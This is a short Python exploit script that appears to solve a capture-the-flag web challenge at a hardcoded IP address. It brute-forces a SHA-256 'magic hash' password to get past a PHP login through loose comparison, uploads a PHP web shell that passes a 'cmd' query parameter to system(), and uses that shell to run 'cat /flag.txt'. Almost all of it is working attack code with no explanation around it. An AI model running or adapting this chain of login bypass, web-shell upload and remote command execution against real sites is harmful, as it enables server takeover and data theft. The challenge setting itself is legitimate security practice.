import hashlib
import requests
import re


"""find passs"""
inters = 0
# while 1:
#     s = str(inters)
#     hash_s = hashlib.sha256(s.encode()).hexdigest()
#     print(f'Scanning: {s}-->{hash_s}')
#     inters +=1
#     r = re.match('^0e[0-9]', hash_s)
#     if r:
#         print(f'Found sha256({s}) --> {hash_s}')


#verify
password = 34250003024812
url = "http://13.215.248.36:31375/"
path1 = "verify.php"
path2 = "upload.php"
data = {"username":"", "password":password, "submit":"Login"}
requests.post(url+path1, data=data).text

#upload file

cookies = {"PHPSESSID": "563d62dc4768e9844bac3ca77d8d55a3"}
headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": f"{url}", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryjgi6m7aYk78JANG9", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": f"{url}upload.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
data = "------WebKitFormBoundaryjgi6m7aYk78JANG9\r\nContent-Disposition: form-data; name=\"fileData\"; filename=\"SHELL.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php system($_GET[\"cmd\"]); ?>\n\r\n------WebKitFormBoundaryjgi6m7aYk78JANG9--\r\n"
response=requests.post(url+path2, headers=headers,cookies=cookies, data=data).text
url_pattern = r'(uploads/\d+\.php)'
file_path = re.search(url_pattern, response)

#get flag

path_flag=f"{file_path[0]}"
param="?cmd="
payload = "cat /flag.txt"

res_flag = requests.get(url+path_flag+param+payload)
print("Flag: ",res_flag.text)
